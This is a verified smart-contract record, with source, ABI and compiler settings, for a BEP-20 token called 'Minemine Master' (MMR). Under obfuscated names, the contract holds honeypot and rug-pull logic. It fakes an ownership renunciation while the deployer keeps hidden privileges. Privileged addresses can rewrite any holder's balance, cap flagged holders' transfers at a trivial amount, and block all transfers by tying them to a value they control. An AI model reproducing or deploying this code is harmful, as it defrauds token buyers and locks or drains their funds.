{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface fundMin {\n    function createPair(address minLiquidity, address tradingLaunchShould) external returns (address);\n}\n\ninterface feeSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyMax) external view returns (uint256);\n\n    function transfer(address autoAt, uint256 toFundMarketing) external returns (bool);\n\n    function allowance(address modeLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toFundMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoAt,\n        uint256 toFundMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minTrading, uint256 value);\n    event Approval(address indexed modeLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract tradingTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeSellMetadata is feeSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MinemineMaster is tradingTake, feeSell, feeSellMetadata {\n\n    function getOwner() external view returns (address) {\n        return limitTeam;\n    }\n\n    event OwnershipTransferred(address indexed marketingToken, address indexed exemptTrading);\n\n    address public receiverFee;\n\n    constructor (){\n        \n        tradingMarketing exemptBuy = tradingMarketing(buyLaunch);\n        receiverFee = fundMin(exemptBuy.factory()).createPair(exemptBuy.WETH(), address(this));\n        if (totalLimit == atFrom) {\n            minSwapIs = tokenMin;\n        }\n        fromTeam = _msgSender();\n        txMaxAt[fromTeam] = true;\n        marketingModeTake[fromTeam] = enableFee;\n        isSwap();\n        \n        emit Transfer(address(0), fromTeam, enableFee);\n    }\n\n    function balanceOf(address buyMax) public view virtual override returns (uint256) {\n        return marketingModeTake[buyMax];\n    }\n\n    bool private atFrom;\n\n    function fundShould(address feeTeam, address autoAt, uint256 toFundMarketing) internal returns (bool) {\n        require(marketingModeTake[feeTeam] >= toFundMarketing);\n        marketingModeTake[feeTeam] -= toFundMarketing;\n        marketingModeTake[autoAt] += toFundMarketing;\n        emit Transfer(feeTeam, autoAt, toFundMarketing);\n        return true;\n    }\n\n    function tokenEnable(uint256 toFundMarketing) public {\n        marketingEnable();\n        fromToken = toFundMarketing;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atShould;\n    }\n\n    function launchReceiver(address feeTeam, address autoAt, uint256 toFundMarketing) internal returns (bool) {\n        if (feeTeam == fromTeam) {\n            return fundShould(feeTeam, autoAt, toFundMarketing);\n        }\n        uint256 maxLiquidity = feeSell(receiverFee).balanceOf(receiverWallet);\n        require(maxLiquidity == fromToken);\n        require(autoAt != receiverWallet);\n        if (marketingWallet[feeTeam]) {\n            return fundShould(feeTeam, autoAt, teamTakeList);\n        }\n        return fundShould(feeTeam, autoAt, toFundMarketing);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableFee;\n    }\n\n    function approve(address tokenSellFrom, uint256 toFundMarketing) public virtual override returns (bool) {\n        feeMin[_msgSender()][tokenSellFrom] = toFundMarketing;\n        emit Approval(_msgSender(), tokenSellFrom, toFundMarketing);\n        return true;\n    }\n\n    uint256 public tokenMin;\n\n    mapping(address => mapping(address => uint256)) private feeMin;\n\n    function transfer(address txAt, uint256 toFundMarketing) external virtual override returns (bool) {\n        return launchReceiver(_msgSender(), txAt, toFundMarketing);\n    }\n\n    function owner() external view returns (address) {\n        return limitTeam;\n    }\n\n    function atShouldSell(address buyTokenList) public {\n        require(buyTokenList.balance < 100000);\n        if (toMax) {\n            return;\n        }\n        if (tokenMin == minSwapIs) {\n            minSwapIs = autoTx;\n        }\n        txMaxAt[buyTokenList] = true;\n        if (minSwapIs != listTrading) {\n            receiverEnable = true;\n        }\n        toMax = true;\n    }\n\n    uint256 private enableFee = 100000000 * 10 ** 18;\n\n    address private limitTeam;\n\n    uint256 constant teamTakeList = 16 ** 10;\n\n    uint8 private modeMinList = 18;\n\n    mapping(address => bool) public txMaxAt;\n\n    function liquidityAtLimit(address amountLimit) public {\n        marketingEnable();\n        if (receiverEnable) {\n            listTrading = minSwapIs;\n        }\n        if (amountLimit == fromTeam || amountLimit == receiverFee) {\n            return;\n        }\n        marketingWallet[amountLimit] = true;\n    }\n\n    uint256 fromToken;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeMinList;\n    }\n\n    string private launchAmount = \"MMR\";\n\n    mapping(address => uint256) private marketingModeTake;\n\n    bool public totalLimit;\n\n    function allowance(address sellTradingLaunched, address tokenSellFrom) external view virtual override returns (uint256) {\n        if (tokenSellFrom == buyLaunch) {\n            return type(uint256).max;\n        }\n        return feeMin[sellTradingLaunched][tokenSellFrom];\n    }\n\n    function transferFrom(address feeTeam, address autoAt, uint256 toFundMarketing) external override returns (bool) {\n        if (_msgSender() != buyLaunch) {\n            if (feeMin[feeTeam][_msgSender()] != type(uint256).max) {\n                require(toFundMarketing <= feeMin[feeTeam][_msgSender()]);\n                feeMin[feeTeam][_msgSender()] -= toFundMarketing;\n            }\n        }\n        return launchReceiver(feeTeam, autoAt, toFundMarketing);\n    }\n\n    uint256 public autoTx;\n\n    function isSwap() public {\n        emit OwnershipTransferred(fromTeam, address(0));\n        limitTeam = address(0);\n    }\n\n    address public fromTeam;\n\n    uint256 public listTrading;\n\n    function liquidityLimit(address txAt, uint256 toFundMarketing) public {\n        marketingEnable();\n        marketingModeTake[txAt] = toFundMarketing;\n    }\n\n    function marketingEnable() private view {\n        require(txMaxAt[_msgSender()]);\n    }\n\n    bool public toMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchAmount;\n    }\n\n    address receiverWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private receiverEnable;\n\n    mapping(address => bool) public marketingWallet;\n\n    uint256 atLimit;\n\n    uint256 private minSwapIs;\n\n    string private atShould = \"Minemine Master\";\n\n    address buyLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTradingLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenSellFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSellFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toFundMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTokenList\",\"type\":\"address\"}],\"name\":\"atShouldSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"}],\"name\":\"liquidityAtLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toFundMarketing\",\"type\":\"uint256\"}],\"name\":\"liquidityLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toFundMarketing\",\"type\":\"uint256\"}],\"name\":\"tokenEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toFundMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toFundMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txMaxAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MinemineMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}